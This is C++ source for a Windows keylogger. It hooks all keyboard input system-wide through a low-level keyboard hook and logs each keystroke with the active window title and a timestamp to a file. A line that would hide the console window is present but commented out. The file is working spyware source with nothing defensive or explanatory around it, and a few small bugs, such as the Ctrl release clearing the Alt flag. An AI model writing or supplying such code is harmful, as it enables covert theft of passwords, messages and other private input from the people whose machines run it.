#include "keylogger.h"

using namespace std;

KeyLogger* KeyLogger::instance = NULL;

KeyLogger::KeyLogger(std::string _logFilePath) {

    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    lshiftDown = false;
    rshiftDown = false;
    altDown = false;
    ctrlDown = false;

	logFilePath = _logFilePath;
	activeWindowTitle = getActiveWindowTitle();
}

KeyLogger::~KeyLogger() {
    logFile.close();
    UnhookWindowsHookEx(hook);
}

KeyLogger* KeyLogger::getInstance() {

    if(instance == NULL) {
        instance = new KeyLogger();
    }

    return instance;
}

void KeyLogger::releaseInstance() {

    if(instance != NULL) {
        delete instance;
        instance = NULL;
    }
}

LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {

	KeyLogger* keylogger = getInstance();

    if (nCode >= 0) {

        if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.scanCode) {

                case SC_LSHIFT:
					if (!keylogger->lshiftDown) {
						keylogger->lshiftDown = true;
						keylogger->keyboardBuffer += "<LSHIFT>";
					}
                    break;
                case SC_RSHIFT:
					if (!keylogger->rshiftDown) {
						keylogger->rshiftDown = true;
						keylogger->keyboardBuffer += "<RSHIFT>";
					}
                    break;
                case SC_ALT:
					if (!keylogger->altDown) {
						keylogger->altDown = true;
						keylogger->keyboardBuffer += "<ALT>";
					}
                    break;
                case SC_CTRL:
					if (!keylogger->ctrlDown) {
						keylogger->ctrlDown = true;
						keylogger->keyboardBuffer += "<CTRL>";
					}
                    break;
				case SC_SPACE:
					keylogger->keyboardBuffer += " ";
					break;
				case SC_ENTER:
					keylogger->keyboardBuffer += "[ENTER]\n";
					break;
                default:
                    DWORD key = 1;
                    key += hooked.scanCode << 16;
                    key += hooked.flags << 24;
					char keyText[100];
					GetKeyNameText(key, keyText, sizeof(keyText));
					keylogger->log(keyText);
            }
        }

        if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.scanCode) {

                case SC_LSHIFT:
					keylogger->lshiftDown = false;
					keylogger->keyboardBuffer += "</LSHIFT>";
                    break;
                case SC_RSHIFT:
					keylogger->rshiftDown = false;
					keylogger->keyboardBuffer += "</RSHIFT>";
                    break;
                case SC_ALT:
					keylogger->altDown = false;
					keylogger->keyboardBuffer += "</ALT>";
                    break;
                case SC_CTRL:
					keylogger->altDown = false;
					keylogger->keyboardBuffer += "</CTRL>";
                    break;
                default:
                    break;
            }
        }
    }

	return CallNextHookEx(keylogger->getHook(), nCode, wParam, lParam);
}

void KeyLogger::listen() {

	HINSTANCE instance = GetModuleHandle(NULL);
	if (!instance) {
		exit(1);
	}

	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);

	logFile.open(logFilePath.c_str(), ios::app);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

void KeyLogger::log(std::string text) {
	
	if (getActiveWindowTitle() != activeWindowTitle) {
		logFile << getTimeString() << endl <<
			activeWindowTitle << endl << "============================" << endl <<
			keyboardBuffer << endl << "============================" << endl << endl;
		activeWindowTitle = getActiveWindowTitle();
		keyboardBuffer = "";
	}

	keyboardBuffer += text;
}

std::string KeyLogger::getTimeString() {
	
	time_t currentTime = time(NULL);
	char dateString[100];
	ctime_s(dateString, sizeof(dateString), &currentTime);
	dateString[strlen(dateString) - 1] = NULL;

	return std::string(dateString);
}

std::string KeyLogger::getActiveWindowTitle() {

    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, title, sizeof(title));
    return std::string(title);
}

HHOOK KeyLogger::getHook() { return hook; }

bool KeyLogger::isAltDown() { return altDown; }

void KeyLogger::setAltDown(bool down) { altDown = down; }

bool KeyLogger::isCtrlDown() { return ctrlDown; }

void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }

bool KeyLogger::isLShiftDown() { return lshiftDown; }

void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }

bool KeyLogger::isRShiftDown() { return rshiftDown; }

void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
